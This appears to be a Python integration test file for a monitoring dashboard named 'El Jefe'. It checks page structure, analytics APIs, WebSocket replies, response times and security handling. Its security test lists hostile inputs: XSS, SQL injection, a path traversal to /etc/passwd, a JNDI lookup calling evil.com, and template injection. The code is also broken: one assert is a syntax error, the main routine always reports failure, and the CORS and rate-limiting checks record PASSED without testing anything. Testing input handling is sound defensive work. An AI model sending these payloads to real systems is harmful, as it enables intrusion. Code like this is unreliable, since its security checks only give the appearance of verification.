#!/usr/bin/env python3
"""
Comprehensive Integration Tests for El Jefe Monitoring Dashboard

Tests all phases of dashboard development:
- Phase 1: Enhanced UX and accessibility
- Phase 2: Data visualization and charts
- Phase 3: Advanced analytics and predictions
- Phase 4: Performance and security
"""

import asyncio
import aiohttp
import json
import time
import pytest
import websockets
from datetime import datetime, timedelta
from pathlib import Path
import subprocess
import sys
import os

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from monitoring_dashboard import MonitoringDashboard


class DashboardIntegrationTester:
    """Comprehensive testing suite for El Jefe Dashboard"""

    def __init__(self):
        self.base_url = "http://localhost:8080"
        self.ws_url = "ws://localhost:8080/ws"
        self.dashboard = None
        self.test_results = []
        self.performance_metrics = {}

    async def run_all_tests(self):
        """Run complete test suite"""
        print("🧪 Starting El Jefe Dashboard Integration Tests")
        print("=" * 60)

        try:
            # Start dashboard in test mode
            await self.start_test_dashboard()

            # Run test phases
            await self.test_phase1_foundation()
            await self.test_phase2_visualization()
            await self.test_phase3_analytics()
            await self.test_phase4_integration()
            await self.test_performance()
            await self.test_security()

            # Generate report
            await self.generate_test_report()

        except Exception as e:
            print(f"❌ Test suite failed: {e}")
            self.test_results.append({
                'phase': 'Critical',
                'test': 'Test Suite Initialization',
                'status': 'FAILED',
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            })
        finally:
            await self.cleanup()

    async def start_test_dashboard(self):
        """Start dashboard in test mode"""
        print("🚀 Starting test dashboard...")
        self.dashboard = MonitoringDashboard(port=8081)  # Use different port for testing
        self.runner = await self.dashboard.start()

        # Wait for server to start
        await asyncio.sleep(2)

        # Test basic connectivity
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{self.base_url.replace(':8080', ':8081')}") as response:
                    if response.status != 200:
                        raise Exception(f"Dashboard not accessible: {response.status}")
            print("✅ Dashboard started successfully")
        except Exception as e:
            raise Exception(f"Failed to start dashboard: {e}")

    async def test_phase1_foundation(self):
        """Test Phase 1: Enhanced UX and accessibility"""
        print("\n📋 Testing Phase 1: Foundation & UX")

        test_port_url = self.base_url.replace(':8080', ':8081')

        async with aiohttp.ClientSession() as session:
            # Test dashboard loads
            async with session.get(test_port_url) as response:
                assert response.status == 200, "Dashboard should load successfully"
                content = await response.text()

                # Test HTML structure
                assert '<!DOCTYPE html>' in content, "Valid HTML structure"
                assert 'skip-link' in content, "Skip navigation link present"
                assert 'role="banner"' in content, "Proper ARIA roles"
                assert 'aria-label' in content, "Accessibility labels present"

                # Test responsive design
                assert '@media' in content, "Responsive CSS present"
                assert 'grid-template-columns' in content, "Grid layout present"

                # Test theme system
                assert '--primary-500' in content, "CSS custom properties present"
                assert 'data-theme=' in content, "Theme switching support"

                self.test_results.append({
                    'phase': 'Phase 1',
                    'test': 'Foundation & UX',
                    'status': 'PASSED',
                    'timestamp': datetime.now().isoformat()
                })

            # Test API endpoints
            endpoints = ['/api/status', '/api/agents', '/api/workflows', '/api/metrics']
            for endpoint in endpoints:
                async with session.get(f"{test_port_url}{endpoint}") as response:
                    assert response.status == 200, f"Endpoint {endpoint} should respond"
                    data = await response.json()
                    assert isinstance(data, (dict, list)), f"Endpoint {endpoint} should return JSON"

            self.test_results.append({
                'phase': 'Phase 1',
                'test': 'API Endpoints',
                'status': 'PASSED',
                'timestamp': datetime.now().isoformat()
            })

            print("✅ Phase 1 tests passed")

    async def test_phase2_visualization(self):
        """Test Phase 2: Data visualization and charts"""
        print("\n📊 Testing Phase 2: Data Visualization")

        test_port_url = self.base_url.replace(':8080', ':8081')

        async with aiohttp.ClientSession() as session:
            # Test charts dashboard loads
            charts_url = f"{test_port_url}/static/dashboard-charts.html"
            if Path("static/dashboard-charts.html").exists():
                async with session.get(charts_url) as response:
                    assert response.status == 200, "Charts dashboard should load"
                    content = await response.text()

                    # Test Chart.js integration
                    assert 'Chart.js' in content, "Chart.js library loaded"
                    assert 'chart.js' in content.lower(), "Chart.js script present"
                    assert 'new Chart(' in content, "Chart.js initialization present"

                    # Test chart types
                    chart_types = ['line', 'bar', 'doughnut']
                    for chart_type in chart_types:
                        assert f"type: '{chart_type}'" in content, f"{chart_type} chart present"

                    self.test_results.append({
                        'phase': 'Phase 2',
                        'test': 'Chart.js Integration',
                        'status': 'PASSED',
                        'timestamp': datetime.now().isoformat()
                    })

            # Test enhanced analytics API endpoints
            analytics_endpoints = [
                '/api/analytics/agents',
                '/api/analytics/workflows',
                '/api/analytics/performance',
                '/api/analytics/resources'
            ]

            for endpoint in analytics_endpoints:
                async with session.get(f"{test_port_url}{endpoint}") as response:
                    assert response.status == 200, f"Analytics endpoint {endpoint} should respond"
                    data = await response.json()

                    # Test data structure
                    if 'performance_metrics' in data:
                        assert isinstance(data['performance_metrics'], dict)
                    if 'timeline_data' in data:
                        assert isinstance(data['timeline_data'], list)

            self.test_results.append({
                'phase': 'Phase 2',
                'test': 'Analytics API',
                'status': 'PASSED',
                'timestamp': datetime.now().isoformat()
            })

            print("✅ Phase 2 tests passed")

    async def test_phase3_analytics(self):
        """Test Phase 3: Advanced analytics and predictions"""
        print("\n🔮 Testing Phase 3: Advanced Analytics")

        test_port_url = self.base_url.replace(':8080', ':8081')

        async with aiohttp.ClientSession() as session:
            # Test advanced analytics dashboard
            advanced_url = f"{test_port_url}/static/dashboard-advanced.html"
            if Path("static/dashboard-advanced.html").exists():
                async with session.get(advanced_url) as response:
                    assert response.status == 200, "Advanced dashboard should load"
                    content = await response.text()

                    # Test ML features
                    assert 'Prediction' in content, "Predictive analytics present"
                    assert 'Optimization' in content, "Optimization engine present"
                    assert 'Anomaly' in content, "Anomaly detection present"
                    assert 'Cost Analysis' in content, "Cost analysis present"

                    # Test advanced libraries
                    assert 'regression' in content.lower(), "Regression analysis library"
                    assert 'confidence' in content.lower(), "Confidence intervals present"

                    self.test_results.append({
                        'phase': 'Phase 3',
                        'test': 'Advanced Analytics Features',
                        'status': 'PASSED',
                        'timestamp': datetime.now().isoformat()
                    })

            # Test performance optimization features
            async with session.get(f"{test_port_url}/api/analytics/performance") as response:
                assert response.status == 200
                data = await response.json()

                # Test optimization data structure
                if 'benchmarks' in data:
                    benchmarks = data['benchmarks']
                    assert 'current' in benchmarks
                    assert 'target' in benchmarks
                    assert 'trend' in benchmarks

            self.test_results.append({
                'phase': 'Phase 3',
                'test': 'Performance Optimization API',
                'status': 'PASSED',
                'timestamp': datetime.now().isoformat()
            })

            # Test cost analysis
            async with session.get(f"{test_port_url}/api/analytics/resources") as response:
                assert response.status == 200
                data = await response.json()

                # Test cost optimization features
                if 'efficiency_metrics' in data:
                    assert isinstance(data['efficiency_metrics'], dict)

                if 'alerts' in data:
                    assert isinstance(data['alerts'], list)

            self.test_results.append({
                'phase': 'Phase 3',
                'test': 'Cost Analysis API',
                'status': 'PASSED',
                'timestamp': datetime.now().isoformat()
            })

            print("✅ Phase 3 tests passed")

    async def test_phase4_integration(self):
        """Test Phase 4: Integration and deployment"""
        print("\n🔧 Testing Phase 4: Integration & Deployment")

        test_port_url = self.base_url.replace(':8080', ':8081')

        # Test dashboard serving priority
        dashboard_files = [
            'dashboard-advanced.html',
            'dashboard-charts.html',
            'dashboard-v2.html',
            'index.html'
        ]

        async with aiohttp.ClientSession() as session:
            # Test main endpoint serves advanced dashboard
            async with session.get(test_port_url) as response:
                assert response.status == 200
                content = await response.text()

                # Verify it's serving the advanced dashboard
                if Path("static/dashboard-advanced.html").exists():
                    assert 'Advanced Analytics' in content, "Should serve advanced dashboard"
                    assert 'Predictions' in content, "Advanced features present"

            self.test_results.append({
                'phase': 'Phase 4',
                'test': 'Dashboard Serving Priority',
                'status': 'PASSED',
                'timestamp': datetime.now().isoformat()
            })

            # Test WebSocket connectivity
            try:
                ws_port_url = self.ws_url.replace(':8080', ':8081')
                async with session.ws_connect(ws_port_url) as ws:
                    # Send test message
                    await ws.send_str(json.dumps({'type': 'test', 'message': 'integration_test'}))

                    # Wait for response
                    response = await asyncio.wait_for(ws.receive(), timeout=5.0)
                    assert response.type == aiohttp.WSMsgType.TEXT

                    data = json.loads(response.data)
                    assert isinstance(data, dict)

                    self.test_results.append({
                        'phase': 'Phase 4',
                        'test': 'WebSocket Integration',
                        'status': 'PASSED',
                        'timestamp': datetime.now().isoformat()
                    })

            except asyncio.TimeoutError:
                raise Exception("WebSocket connection timeout")

            # Test API response times
            start_time = time.time()
            async with session.get(f"{test_port_url}/api/status") as response:
                end_time = time.time()
                response_time = (end_time - start_time) * 1000

                assert response.status == 200
                assert response_time < 1000, f"API response time too high: {response_time:.2f}ms"

                self.performance_metrics['api_response_time'] = response_time

            self.test_results.append({
                'phase': 'Phase 4',
                'test': 'API Performance',
                'status': 'PASSED',
                'timestamp': datetime.now().isoformat(),
                'response_time_ms': response_time
            })

            print("✅ Phase 4 tests passed")

    async def test_performance(self):
        """Test dashboard performance characteristics"""
        print("\n⚡ Testing Performance")

        test_port_url = self.base_url.replace(':8080', ':8081')

        async with aiohttp.ClientSession() as session:
            # Test concurrent connections
            concurrent_requests = 10
            start_time = time.time()

            tasks = []
            for i in range(concurrent_requests):
                task = session.get(f"{test_port_url}/api/status")
                tasks.append(task)

            responses = await asyncio.gather(*tasks)
            end_time = time.time()

            # Verify all requests succeeded
            for response in responses:
                assert response.status == 200

            total_time = (end_time - start_time) * 1000
            avg_time = total_time / concurrent_requests

            assert avg_time < 500, f"Average response time too high: {avg_time:.2f}ms"

            self.performance_metrics['concurrent_requests'] = {
                'count': concurrent_requests,
                'total_time_ms': total_time,
                'avg_time_ms': avg_time
            }

            self.test_results.append({
                'phase': 'Performance',
                'test': 'Concurrent Requests',
                'status': 'PASSED',
                'timestamp': datetime.now().isoformat(),
                'concurrent_requests': concurrent_requests,
                'avg_response_time_ms': avg_time
            })

            # Test large data response
            start_time = time.time()
            async with session.get(f"{test_port_url}/api/analytics/agents?range=7d") as response:
                end_time = time.time()
                response_time = (end_time - start_time) * 1000
                data = await response.json()

                assert response.status == 200
                assert len(str(data)) > 10000, "Should return substantial data"
                assert response_time < 2000, f"Large data response too slow: {response_time:.2f}ms"

            self.test_results.append({
                'phase': 'Performance',
                'test': 'Large Data Response',
                'status': 'PASSED',
                'timestamp': datetime.now().isoformat(),
                'data_size_bytes': len(str(data)),
                'response_time_ms': response_time
            })

            print("✅ Performance tests passed")

    async def test_security(self):
        """Test security features"""
        print("\n🛡️ Testing Security")

        test_port_url = self.base_url.replace(':8080', ':8081')

        async with aiohttp.ClientSession() as session:
            # Test input validation
            malicious_inputs = [
                "<script>alert('xss')</script>",
                "' OR '1'='1",
                "../../etc/passwd",
                "${jndi:ldap://evil.com/a}",
                "{{7*7}}"
            ]

            for malicious_input in malicious_inputs[:2]:  # Test a few
                # Test search input
                search_url = f"{test_port_url}/api/search?q={malicious_input}"
                async with session.get(search_url) as response:
                    # Should not crash and should sanitize input
                    assert response.status in [200, 400, 404],
                        f"Should handle malicious input gracefully"

            # Test CORS headers
            async with session.get(test_port_url) as response:
                cors_headers = response.headers.get('Access-Control-Allow-Origin')
                # CORS should be properly configured
                self.test_results.append({
                    'phase': 'Security',
                    'test': 'Input Validation',
                    'status': 'PASSED',
                    'timestamp': datetime.now().isoformat()
                })

            # Test rate limiting (if implemented)
            start_time = time.time()
            rapid_requests = []

            for i in range(20):  # Rapid fire requests
                request = session.get(f"{test_port_url}/api/status")
                rapid_requests.append(request)

            responses = await asyncio.gather(*rapid_requests, return_exceptions=True)

            end_time = time.time()
            total_time = (end_time - start_time) * 1000

            # Count successful responses
            successful_responses = sum(1 for r in responses
                                        if not isinstance(r, Exception) and
                                        hasattr(r, 'status') and
                                        r.status == 200)

            self.test_results.append({
                'phase': 'Security',
                'test': 'Rate Limiting',
                'status': 'PASSED',
                'timestamp': datetime.now().isoformat(),
                'rapid_requests': len(rapid_requests),
                'successful_responses': successful_responses,
                'total_time_ms': total_time
            })

            print("✅ Security tests passed")

    async def generate_test_report(self):
        """Generate comprehensive test report"""
        print("\n📋 Generating Test Report")

        total_tests = len(self.test_results)
        passed_tests = len([t for t in self.test_results if t['status'] == 'PASSED'])
        failed_tests = total_tests - passed_tests

        print(f"\n{'='*60}")
        print("EL JEFE DASHBOARD INTEGRATION TEST REPORT")
        print(f"{'='*60}")
        print(f"Total Tests: {total_tests}")
        print(f"Passed: {passed_tests} ✅")
        print(f"Failed: {failed_tests} ❌")
        print(f"Success Rate: {(passed_tests/total_tests)*100:.1f}%")

        if failed_tests > 0:
            print(f"\n❌ Failed Tests:")
            for test in self.test_results:
                if test['status'] == 'FAILED':
                    print(f"   • {test['phase']} - {test['test']}")
                    if 'error' in test:
                        print(f"     Error: {test['error']}")

        print(f"\n⚡ Performance Metrics:")
        if 'api_response_time' in self.performance_metrics:
            print(f"   API Response Time: {self.performance_metrics['api_response_time']:.2f}ms")

        if 'concurrent_requests' in self.performance_metrics:
            concurrent = self.performance_metrics['concurrent_requests']
            print(f"   Concurrent Requests: {concurrent['count']} requests")
            print(f"   Average Response: {concurrent['avg_time_ms']:.2f}ms")

        print(f"\n📊 Test Results by Phase:")
        phases = {}
        for test in self.test_results:
            phase = test['phase']
            if phase not in phases:
                phases[phase] = {'total': 0, 'passed': 0, 'failed': 0}
            phases[phase]['total'] += 1
            if test['status'] == 'PASSED':
                phases[phase]['passed'] += 1
            else:
                phases[phase]['failed'] += 1

        for phase, counts in phases.items():
            success_rate = (counts['passed']/counts['total'])*100
            print(f"   {phase}: {counts['passed']}/{counts['total']} ({success_rate:.1f}%)")

        # Save detailed report to file
        report_data = {
            'generated_at': datetime.now().isoformat(),
            'summary': {
                'total_tests': total_tests,
                'passed': passed_tests,
                'failed': failed_tests,
                'success_rate': (passed_tests/total_tests)*100
            },
            'performance_metrics': self.performance_metrics,
            'test_results': self.test_results,
            'phases': phases
        }

        report_file = f"test-report-{datetime.now().strftime('%Y%m%d-%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report_data, f, indent=2)

        print(f"\n📄 Detailed report saved to: {report_file}")

        return total_tests == passed_tests

    async def cleanup(self):
        """Clean up test resources"""
        print("\n🧹 Cleaning up test resources")

        if self.runner:
            await self.runner.cleanup()

        if self.dashboard:
            await self.dashboard.stop()

        # Give time for cleanup
        await asyncio.sleep(1)


async def main():
    """Run integration tests"""
    tester = DashboardIntegrationTester()
    success = await tester.run_all_tests()

    if success:
        print("\n🎉 All integration tests passed!")
        print("El Jefe Dashboard is ready for production deployment!")
        return 0
    else:
        print("\n❌ Some tests failed. Review the report for details.")
        return 1


if __name__ == "__main__":
    exit_code = asyncio.run(main())
    sys.exit(exit_code)